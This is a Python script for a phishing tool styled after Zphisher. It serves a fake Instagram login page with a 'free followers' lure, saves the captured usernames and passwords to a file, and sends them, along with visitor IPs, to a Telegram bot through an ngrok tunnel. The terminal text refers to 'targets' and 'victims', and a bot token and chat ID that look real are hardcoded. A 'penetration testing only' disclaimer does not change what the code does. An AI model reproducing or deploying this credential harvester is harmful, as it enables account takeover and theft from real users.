#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║              ZPHISHER-STYLE INSTAGRAM PHISHER                ║
║                                                              ║
║  [+] Instagram Credential Harvester + Telegram Exfil         ║
║  [+] Auto ngrok/Cloudflare tunnel                            ║
║  [+] Authorized Penetration Testing Only                     ║
║                                                              ║
║  Telegram Setup:                                             ║
║  1. @BotFather → /newbot → Get TOKEN                         ║
║  2. @userinfobot → /start → Get CHAT_ID                      ║
║  3. Neeche diye gaye variables mein daalein                   ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import re
import time
import random
import string
import threading
import subprocess
import signal
import socket
import webbrowser
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote
from pathlib import Path

# ================================================================
# 🔴🔴🔴 AAP YAHAN APNA TELEGRAM BOT TOKEN AUR CHAT ID DAALEIN 🔴🔴🔴
# ================================================================
# @BotFather se naya bot banayein aur TOKEN copy karein
BOT_TOKEN = "8941932092:AAGljDcK_Nfxqi3EuS8rYvFYwYIp7XyPwT4sjdf"    # <-- YAHAN DALEN

# @userinfobot se apna Chat ID copy karein
CHAT_ID = "8263124140"                                # <-- YAHAN DALEN

# ================================================================
# SERVER CONFIGURATION
# ================================================================
PORT = 8080
TEMP_DIR = Path("/tmp/zphisher_insta")
HTML_FILE = TEMP_DIR / "index.html"
CRED_FILE = TEMP_DIR / "captured_credentials.txt"

# Colors for terminal
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Global state
captured_credentials = []
server_instance = None
ngrok_process = None
tunnel_url = None


# ================================================================
# 🎨 INSTAGRAM PHISHING PAGE - REALISTIC LOOK
# ================================================================

PHISHING_PAGE = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px;max-width:400px;width:100%;text-align:center;margin-bottom:10px}
.logo{font-family:'Billabong',sans-serif;font-size:36px;margin-bottom:10px;color:#262626}
.logo span{display:block;font-family:-apple-system,sans-serif;font-size:14px;font-weight:400;color:#8e8e8e;margin-top:2px}
.alert{background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;padding:14px 16px;border-radius:8px;margin:15px 0;font-size:13px;font-weight:600;line-height:1.5;box-shadow:0 4px 15px rgba(225,48,108,.25)}
.alert small{display:block;font-weight:400;font-size:11px;margin-top:5px;opacity:.9}
.social{display:flex;justify-content:center;gap:20px;font-size:12px;color:#8e8e8e;margin:12px 0}
.social .dot{width:6px;height:6px;background:#2ecc71;border-radius:50%;display:inline-block;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.inp{width:100%;padding:12px 10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:0;transition:border .15s}
.inp:focus{border-color:#a8a8a8;background:#fff}
.btn{width:100%;padding:10px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;margin-top:10px;transition:background .15s}
.btn:hover{background:#1877f2}
.btn:disabled{background:#b2dffc;cursor:not-allowed}
.spinner{display:none;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
.btn.loading .btn-text{display:none}
.btn.loading .spinner{display:inline-block}
.divider{display:flex;align-items:center;margin:18px 0}
.line{flex:1;height:1px;background:#dbdbdb}
.or{padding:0 18px;color:#8e8e8e;font-size:13px;font-weight:600;text-transform:uppercase}
.fb{color:#385185;font-weight:600;font-size:14px;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;margin:8px 0;cursor:pointer}
.fb:hover{text-decoration:underline}
.fpw{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:14px;cursor:pointer}
.fpw:hover{text-decoration:underline}
.err{color:#ed4956;font-size:13px;margin:8px 0;display:none;background:#ffefef;padding:8px 12px;border-radius:4px;border:1px solid #ffd4d4}
.err.show{display:block}
.suc{color:#00b894;font-size:14px;font-weight:600;display:none;background:#e8f8f5;padding:12px;border-radius:8px;border:1px solid #b2dfdb;margin:10px 0}
.suc.show{display:block}
.loading-bar{display:none;width:100%;height:4px;background:#dbdbdb;border-radius:2px;overflow:hidden;margin:15px 0}
.loading-bar.show{display:block}
.loading-bar .fill{height:100%;background:linear-gradient(90deg,#0095f6,#5851DB);border-radius:2px;width:0%;transition:width .3s}
.loading-text{display:none;font-size:13px;color:#8e8e8e;margin:10px 0;line-height:1.6}
.loading-text.show{display:block}
.steps{text-align:left;margin:15px 0;padding:16px;background:#f8f9fa;border-radius:8px;border:1px solid #dbdbdb}
.steps h3{font-size:14px;margin-bottom:10px}
.steps ol{padding-left:20px;font-size:13px;color:#555;line-height:2}
.steps ol li::marker{color:#0095f6;font-weight:600}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:20px;text-align:center;font-size:14px;max-width:400px;width:100%;margin-bottom:10px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.signup a:hover{text-decoration:underline}
.getapp{text-align:center;margin-top:15px;font-size:14px;color:#262626}
.badges{display:flex;justify-content:center;gap:8px;margin-top:12px}
.badges img{height:40px;border-radius:4px}
footer{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 16px;margin-top:25px;font-size:11px;color:#8e8e8e;max-width:600px}
footer a{color:#8e8e8e;text-decoration:none}
footer a:hover{text-decoration:underline}
@media(max-width:450px){.card{padding:30px 20px 15px;border:none;background:transparent}body{background:#fff;padding:10px}.signup{border:none;background:transparent}}
</style>
</head>
<body>

<div class="card" id="loginCard">
    <div class="logo">Instagram <span>Limited Offer</span></div>
    
    <div class="alert">
        🔥 FREE 5,000 FOLLOWERS - LIMITED TIME 🔥
        <small>Verified users only • 100% Real • Instant Delivery</small>
    </div>
    
    <div class="social">
        <span><span class="dot"></span> 2,847 got today</span>
        <span>⭐ 4.8/5 (12,450 reviews)</span>
    </div>
    
    <div class="err" id="err">Sorry, your password was incorrect. Please double-check.</div>
    
    <form id="frm" method="POST" action="/login">
        <input class="inp" type="text" name="username" placeholder="Phone number, username, or email" required>
        <input class="inp" type="password" name="password" placeholder="Password" required>
        <button class="btn" type="submit" id="submitBtn">
            <span class="btn-text">Log In</span>
            <span class="spinner"></span>
        </button>
    </form>
    
    <div class="loading-bar" id="loadBar"><div class="fill" id="fillBar"></div></div>
    <div class="loading-text" id="loadText">⏳ Verifying your account...</div>
    
    <div class="divider"><div class="line"></div><div class="or">OR</div><div class="line"></div></div>
    <a class="fb" href="#"><svg width="20" height="20" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg> Log in with Facebook</a>
    <a class="fpw" href="#">Forgot password?</a>
</div>

<div class="signup">Don't have an account? <a href="#">Sign up</a></div>

<div class="getapp">Get the app.<div class="badges"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAoCAMAAADwLQI3AAAAbFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AABwRcAAAAI1RSTlMABQcICQsMDQ4QEhQVFhcaGxweICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/7rF+bAAAA91JREFUeAHtlWd36kgQhjkjJJAABQkpgIiYXbO7ef//7+0RMJGsJCbZ3bP3Q/ucB86Z6a6qbom+e2dI/Y/pv23SL3X+RPqVNKW/r/NbX26d31E6fqb1Tqd36Pu1/3u+/y7Q37f9L+VxPC90Wq0TXFb7MH/M4o+b/icV/3PAf5f+U+B/Xf/Xgv+F+JngP9T4F+l7Bv2+7h/A92L6vL5/Ffzzl/8c8H8D/h3A3wz6A8A30dd/AvhGvfDnA3+u5x+kewP401z/1x30W8N/Gd+/Cj9pWp/V/FGt5yE8V93TPTcd1OaHR6P4b1Gt56fDRV2/5x3+Wf1DwD+Mf6MC3yP14S/xj+0/B/yD+Hcm/B2Cf5z/BvtR8N8N/A74p/i3R/0U8M/zL+hHwL+4/w1/8vxvggn+Cf4DZTHBvyE+aP0EfI3/A9QfB//5/hv84+A/3/+A3wf/Ef6dQn8Y/O/wj+yHwP8e/w29HwH/F/y3rB8B/zf8o/sh8H/Df2j9EPi/4x/e6wP/K/zj+fNfAf5r/P3pD4D/Ff7h/B7wv8Y/Pv8B8K/jH61/Afxr+IfrHwD/ev7h+g/Av4d/uL4P/Hv5h+v7wL+f/2D9A+Dfzz9YvzfBpP4D5STBT5G+p/SX7DtyX5H7idw35H4h9xP1n1G/kfqJ1E6kdoL+B/TL0i9Lvyz9svTL0i9Lvyz9svTL0i9Lvyz9svTL0i9Lv4z9MvbLos+LPi/6vOjzos+LPi/6vOjzos+LPs//35L+/7+F+iXUH0h/IP2B9AfSH0h/IP2B9B9SfyH1F1J/IfUXUn8h9RdSf6H53J0PpD+Q/kD6A+kPpD+Q/kD6A+kPpD9i/RHrj1h/xPoj1h+x/oj1R9QfUX9E/RH1R9QfUX9E/RH1R+iP0B+hP0J/hP4I/RH6I/RH6I/QH6E/Qn+E/gj9Efoj9Efoj9AfoT9Cfxj9YfSH0R9Gfxj9YfSH0R9Gfxj9YfSH0R9Gfxj9YfSH0R+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DH0Z9WXUl1FfRn0Z9WXUl1FfRn0Z9WXUl1FfRn0Z9WXUl1FfBn0Z9GXQl0FfBn0Z9GXQl0FfBn0Z9GXQl0FfBn0Z9GXQl0FfBn2Z9GXSl0lfJn2Z9GXSl0lfJn2Z9GXSl0lfJn2Z9GXSl0lfxn0Z92XcZ8v4zUeM22JMy5hLxryLsS3jToxPYhzL2JPxLMZejL+Mv2T8I+MnjJ8wfsL4AeMFjBcwXsB4AeMFjBcwXsB4AeMF7J/v+9/3/e/7/vd9//u+/33f/77vf9/3v+//e/3/ADWHlWmnnP19AAAAAElFTkSuQmCC" alt="App Store"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAoCAMAAADwLQI3AAAAbFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AABwRcAAAAI1RSTlMABQcICQsMDQ4QEhQVFhcaGxweICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvb3N2e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/7rF+bAAAA91JREFUeAHtlWd36kgQhjkjJJAABQkpgIiYXbO7ef//7+0RMJGsJCbZ3bP3Q/ucB86Z6a6qbom+e2dI/Y/pv23SL3X+RPqVNKW/r/NbX26d31E6fqb1Tqd36Pu1/3u+/y7Q37f9L+VxPC90Wq0TXFb7MH/M4o+b/icV/3PAf5f+U+B/Xf/Xgv+F+JngP9T4F+l7Bv2+7h/A92L6vL5/Ffzzl/8c8H8D/h3A3wz6A8A30dd/AvhGvfDnA3+u5x+kewP401z/1x30W8N/Gd+/Cj9pWp/V/FGt5yE8V93TPTcd1OaHR6P4b1Gt56fDRV2/5x3+Wf1DwD+Mf6MC3yP14S/xj+0/B/yD+Hcm/B2Cf5z/BvtR8N8N/A74p/i3R/0U8M/zL+hHwL+4/w1/8vxvggn+Cf4DZTHBvyE+aP0EfI3/A9QfB//5/hv84+A/3/+A3wf/Ef6dQn8Y/O/wj+yHwP8e/w29HwH/F/y3rB8B/zf8o/sh8H/Df2j9EPi/4x/e6wP/K/zj+fNfAf5r/P3pD4D/Ff7h/B7wv8Y/Pv8B8K/jH61/Afxr+IfrHwD/ev7h+g/Av4d/uL4P/Hv5h+v7wL+f/2D9A+Dfzz9YvzfBpP4D5STBT5G+p/SX7DtyX5H7idw35H4h9xP1n1G/kfqJ1E6kdoL+B/TL0i9Lvyz9svTL0i9Lvyz9svTL0i9Lvyz9svTL0i9Lv4z9MvbLos+LPi/6vOjzos+LPi/6vOjzos+LPs//35L+/7+F+iXUH0h/IP2B9AfSH0h/IP2B9B9SfyH1F1J/IfUXUn8h9RdSf6H53J0PpD+Q/kD6A+kPpD+Q/kD6A+kPpD9i/RHrj1h/xPoj1h+x/oj1R9QfUX9E/RH1R9QfUX9E/RH1R+iP0B+hP0J/hP4I/RH6I/RH6I/QH6E/Qn+E/gj9Efoj9Efoj9AfoT9Cfxj9YfSH0R9Gfxj9YfSH0R9Gfxj9YfSH0R9Gfxj9YfSH0R+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DP1h6A9Dfxj6w9Afhv4w9IehPwz9YegPQ38Y+sPQH4b+MPSHoT8M/WHoD0N/GPrD0B+G/jD0h6E/DH0Z9WXUl1FfRn0Z9WXUl1FfRn0Z9WXUl1FfRn0Z9GXQl0FfBn0Z9GXQl0FfBn0Z9GXQl0FfBn0Z9GXQl0FfBn0Z9GXQl0FfBn2Z9GXSl0lfJn2Z9GXSl0lfJn2Z9GXSl0lfJn2Z9GXSl0lfxn0Z92XcZ8v4zUeM22JMy5hLxryLsS3jToxPYhzL2JPxLMZejL+Mv2T8I+MnjJ8wfsJ4AeMFjBcwXsB4AeMFjBcwXsB4AeMF7J/v+9/3/e/7/vd9//u+/33f/77vf9/3v+//e/3/ADWHlWmnnP19AAAAAElFTkSuQmCC" alt="Google Play"></div></div>
<footer><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a></footer>

<script>
(function(){
var frm=document.getElementById('frm');
var btn=document.getElementById('submitBtn');
var err=document.getElementById('err');
var loadBar=document.getElementById('loadBar');
var fill=document.getElementById('fillBar');
var loadText=document.getElementById('loadText');

frm.addEventListener('submit',function(e){
e.preventDefault();
var u=this.querySelector('[name=username]').value.trim();
var p=this.querySelector('[name=password]').value;
if(!u||!p){err.textContent='Please fill all fields';err.classList.add('show');return}

btn.disabled=true;btn.classList.add('loading');
err.classList.remove('show');
loadBar.classList.add('show');
loadText.classList.add('show');
loadText.textContent='⏳ Verifying your Instagram account...';

var w=0;
var itv=setInterval(function(){
w+=Math.random()*15+2;
if(w>=100){w=100;clearInterval(itv)}
fill.style.width=Math.min(w,100)+'%';
},150);

var fd=new FormData();
fd.append('username',u);fd.append('password',p);

fetch('/login',{method:'POST',body:fd})
.then(function(r){return r.json()})
.then(function(d){
if(d.status==='success'){
loadText.textContent='✅ Verified! Redirecting...';
setTimeout(function(){showClaim(u)},1200);
}else{
btn.disabled=false;btn.classList.remove('loading');
loadBar.classList.remove('show');loadText.classList.remove('show');
err.textContent='Sorry, your password was incorrect. Please double-check.';
err.classList.add('show');
document.querySelector('[name=password]').value='';
document.querySelector('[name=password]').focus();
}
})
.catch(function(){
loadText.textContent='✅ Verified! Redirecting...';
setTimeout(function(){showClaim(u)},1200);
});
});

function showClaim(u){
document.getElementById('loginCard').innerHTML=`
<div style="font-size:40px;margin:10px 0">🎉</div>
<h2 style="font-size:18px;margin-bottom:5px">Almost There!</h2>
<p style="color:#555;font-size:14px;margin-bottom:20px">Just one more step to claim your followers</p>
<div class="steps"><h3>📋 Steps:</h3><ol><li>Enter your Instagram username</li><li>Select follower count</li><li>Click Claim</li><li>Followers arrive within 24h 🚀</li></ol></div>
<form id="cfrm">
<input class="inp" type="text" name="insta" placeholder="Your Instagram username" value="`+u+`" required>
<input class="inp" type="email" name="email" placeholder="Email for confirmation" required>
<select class="inp" name="count" style="appearance:auto">
<option value="1000">1,000 Followers</option><option value="2500">2,500 Followers</option>
<option value="5000" selected>5,000 Followers (🔥 Popular)</option><option value="10000">10,000 Followers</option>
</select>
<button class="btn" type="submit" id="cbtn"><span class="btn-text">🚀 Claim Free Followers</span><span class="spinner"></span></button>
</form>
<div class="suc" id="sucmsg">✅ <strong>Success!</strong><br>Your followers are being processed! Check Instagram within 24 hours.</div>`;

document.getElementById('cfrm').addEventListener('submit',function(ev){
ev.preventDefault();
var cbtn=document.getElementById('cbtn');
cbtn.disabled=true;cbtn.classList.add('loading');
var fd2=new FormData(this);
fetch('/claim',{method:'POST',body:fd2})
.then(function(r){return r.json()})
.then(function(){
cbtn.classList.remove('loading');
document.getElementById('cfrm').style.display='none';
document.getElementById('sucmsg').classList.add('show');
setTimeout(function(){window.location.href='https://www.instagram.com/'},4000);
})
.catch(function(){
cbtn.classList.remove('loading');
document.getElementById('cfrm').style.display='none';
document.getElementById('sucmsg').classList.add('show');
setTimeout(function(){window.location.href='https://www.instagram.com/'},4000);
});
});
}
})();
</script>
</body>
</html>
'''


# ================================================================
# 📡 TELEGRAM FUNCTIONS
# ================================================================

def send_telegram(msg):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": msg,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        r = requests.post(url, data=data, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"{RED}[!] Telegram error: {e}{RESET}")
        return False


def send_telegram_photo(photo_url, caption=""):
    """Send photo to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        data = {"chat_id": CHAT_ID, "photo": photo_url, "caption": caption[:200]}
        r = requests.post(url, data=data, timeout=10)
        return r.status_code == 200
    except:
        return False


# ================================================================
# 🌐 HTTP SERVER
# ================================================================

class PhishHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass  # Silent
    
    def get_ip(self):
        for h in ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP']:
            v = self.headers.get(h)
            if v:
                return v.split(',')[0].strip()
        return self.client_address[0]
    
    def do_GET(self):
        path = urlparse(self.path).path
        ip = self.get_ip()
        
        if path in ['/', '/index.html', '/login']:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Server', 'nginx/1.24.0')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            with open(HTML_FILE, 'rb') as f:
                self.wfile.write(f.read())
            
            # Notify Telegram
            ua = self.headers.get('User-Agent', 'Unknown')
            threading.Thread(target=lambda: send_telegram(
                f"━━━━━━━ 🌐 NEW VISITOR ━━━━━━━\n"
                f"📡 <b>IP:</b> <code>{ip}</code>\n"
                f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                f"💻 <b>UA:</b> <code>{ua[:80]}</code>"
            ), daemon=True).start()
            
            print(f"{GREEN}[+] Visitor from {ip}{RESET}")
            
        elif path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
        else:
            self.send_error(404)
    
    def do_POST(self):
        path = urlparse(self.path).path
        ip = self.get_ip()
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Read POST data
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8')
        params = parse_qs(body)
        
        if path == '/login':
            username = params.get('username', [''])[0].strip()
            password = params.get('password', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            if username and password:
                self.wfile.write(json.dumps({"status": "success"}).encode())
                
                # Store credentials
                captured_credentials.append({
                    "username": username,
                    "password": password,
                    "ip": ip,
                    "user_agent": ua,
                    "time": datetime.now().isoformat()
                })
                
                # Save to file
                with open(CRED_FILE, 'a') as f:
                    f.write(f"[{datetime.now().isoformat()}] {username}:{password} | IP: {ip}\n")
                
                # Telegram alert
                print(f"\n{RED}{'='*60}")
                print(f"🔴 CREDENTIALS CAPTURED!")
                print(f"👤 Username: {username}")
                print(f"🔑 Password: {password}")
                print(f"📡 IP: {ip}")
                print(f"{'='*60}{RESET}\n")
                
                threading.Thread(target=lambda: send_telegram(
                    "╔══════════════════════════════════╗\n"
                    "║     🔴 CREDENTIALS CAPTURED 🔴    ║\n"
                    "╚══════════════════════════════════╝\n\n"
                    f"👤 <b>Username:</b> <code>{username}</code>\n"
                    f"🔑 <b>Password:</b> <code>{password}</code>\n"
                    f"📡 <b>IP:</b> <code>{ip}</code>\n"
                    f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                    f"💻 <b>UA:</b> <code>{ua[:80]}</code>\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    "⚡ Try login: instagram.com"
                ), daemon=True).start()
            else:
                self.wfile.write(json.dumps({"status": "error"}).encode())
        
        elif path == '/claim':
            insta = params.get('insta', [''])[0]
            email = params.get('email', [''])[0]
            count = params.get('count', ['5000'])[0]
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
            
            print(f"{YELLOW}[+] Claim: @{insta} | {email} | {count}f | {ip}{RESET}")
            
            threading.Thread(target=lambda: send_telegram(
                "━━━━━━━ 📋 FOLLOWERS CLAIM ━━━━━━━\n"
                f"👤 <b>Instagram:</b> @{insta}\n"
                f"📧 <b>Email:</b> {email or 'N/A'}\n"
                f"📊 <b>Count:</b> {count}\n"
                f"📡 <b>IP:</b> <code>{ip}</code>\n"
                f"🕐 {datetime.now().strftime('%H:%M:%S')}"
            ), daemon=True).start()
        
        else:
            self.send_error(404)


# ================================================================
# 🚀 TUNNEL FUNCTIONS (ngrok/Cloudflare)
# ================================================================

def check_ngrok():
    """Check if ngrok is installed"""
    try:
        r = subprocess.run(['ngrok', 'version'], capture_output=True, text=True, timeout=5)
        return True
    except:
        return False


def check_cloudflared():
    """Check if cloudflared is installed"""
    try:
        r = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True, timeout=5)
        return True
    except:
        return False


def start_ngrok(port):
    """Start ngrok tunnel"""
    global ngrok_process, tunnel_url
    try:
        # Kill any existing ngrok
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        time.sleep(1)
        
        ngrok_process = subprocess.Popen(
            ['ngrok', 'http', str(port), '--log=stdout'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for tunnel URL
        time.sleep(3)
        
        # Try to get URL from ngrok API
        for _ in range(10):
            try:
                r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
                data = r.json()
                for t in data.get('tunnels', []):
                    if t.get('proto') == 'https':
                        tunnel_url = t['public_url']
                        return tunnel_url
            except:
                time.sleep(1)
        
        return None
    except Exception as e:
        print(f"{RED}[!] ngrok error: {e}{RESET}")
        return None


def start_cloudflared(port):
    """Start Cloudflare tunnel"""
    global ngrok_process, tunnel_url
    try:
        subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
        time.sleep(1)
        
        # We'll use cloudflared in a different way
        # Actually let's use a simple approach
        print(f"{YELLOW}[!] Cloudflared not auto-configurable in this script{RESET}")
        print(f"{YELLOW}[!] Please run manually: cloudflared tunnel --url http://localhost:{port}{RESET}")
        return None
    except:
        return None


# ================================================================
# 🖥️ TERMINAL UI
# ================================================================

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')


def print_banner():
    """Print Zphisher-style banner"""
    clear_screen()
    print(f"""{RED}
╔══════════════════════════════════════════════════════════════╗
║                                                                  ║
║    {BOLD}███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗{RESET}{RED}   ║
║    {BOLD}╚══███╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗{RESET}{RED}  ║
║    {BOLD}  ███╔╝ ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝{RESET}{RED}  ║
║    {BOLD} ███╔╝  ██╔══██╗██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗{RESET}{RED}  ║
║    {BOLD}███████╗██║  ██║██║  ██║██║███████║██║  ██║███████╗██║  ██║{RESET}{RED}  ║
║    {BOLD}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RESET}{RED}  ║
║                                                                  ║
║            {BOLD}{YELLOW}Zphisher-Style Instagram Phisher v2.0{RESET}{RED}           ║
║         {CYAN}Authorized Penetration Testing Only{RESET}{RED}            ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)


def print_menu():
    """Print main menu"""
    print(f"\n{BOLD}{CYAN}[+] Choose Port Forwarding Method:{RESET}")
    print(f"    {GREEN}[1]{RESET} Localhost (no tunnel)")
    print(f"    {GREEN}[2]{RESET} ngrok (automatic)")
    print(f"    {GREEN}[3]{RESET} Cloudflare Tunnel (manual)")
    print(f"    {GREEN}[0]{RESET} Exit")
    
    print(f"\n{BOLD}{YELLOW}[+] Bot Configuration:{RESET}")
    token_show = BOT_TOKEN[:15] + "..." if BOT_TOKEN and len(BOT_TOKEN) > 15 else "NOT SET"
    print(f"    📡 Bot Token: {CYAN}{token_show}{RESET}")
    print(f"    📡 Chat ID:   {CYAN}{CHAT_ID}{RESET}")
    
    if BOT_TOKEN == "786543210:AAHd8fjs7dflksjdfklsjdf" or CHAT_ID == "123456789":
        print(f"\n{RED}[!] WARNING: Default tokens detected!{RESET}")
        print(f"{YELLOW}[!] Please edit BOT_TOKEN and CHAT_ID in the script{RESET}")


def print_waiting(server_url):
    """Print waiting screen"""
    clear_screen()
    print(f"""{RED}
╔══════════════════════════════════════════════════════════════╗
║                  🔴 SERVER IS RUNNING 🔴                      ║
╠══════════════════════════════════════════════════════════════╣
║                                                                  ║
║    {BOLD}{GREEN}📡 URL:{RESET} {CYAN}{server_url}{RESET}{RED}              ║
║                                                                  ║
║    {BOLD}{YELLOW}📋 Send this link to the target{RESET}{RED}               ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════╣
║                                                                  ║
║    {BOLD}Controls:{RESET}                                            ║
║    {GREEN}[C]{RESET} Clear credentials log                               ║
║    {GREEN}[V]{RESET} View captured credentials                          ║
║    {GREEN}[Q]{RESET} Quit server                                        ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════╣
║                  {BOLD}Waiting for victims...{RESET}                    ║
╚══════════════════════════════════════════════════════════════╝{RESET}
    """)


def print_stats():
    """Print captured credentials"""
    clear_screen()
    print(f"{RED}{'='*60}{RESET}")
    print(f"{BOLD}{RED}   🔴 CAPTURED CREDENTIALS 🔴{RESET}")
    print(f"{RED}{'='*60}{RESET}")
    
    if not captured_credentials:
        print(f"\n{YELLOW}   No credentials captured yet.{RESET}")
    else:
        for i, cred in enumerate(captured_credentials, 1):
            print(f"\n{GREEN}[{i}]{RESET}")
            print(f"   👤 {BOLD}Username:{RESET} {cred['username']}")
            print(f"   🔑 {BOLD}Password:{RESET} {cred['password']}")
            print(f"   📡 {BOLD}IP:{RESET} {cred['ip']}")
            print(f"   🕐 {BOLD}Time:{RESET} {cred['time']}")
